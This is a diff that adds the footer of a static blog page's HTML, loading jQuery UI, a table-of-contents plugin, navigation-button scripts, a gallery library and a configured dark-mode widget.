+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
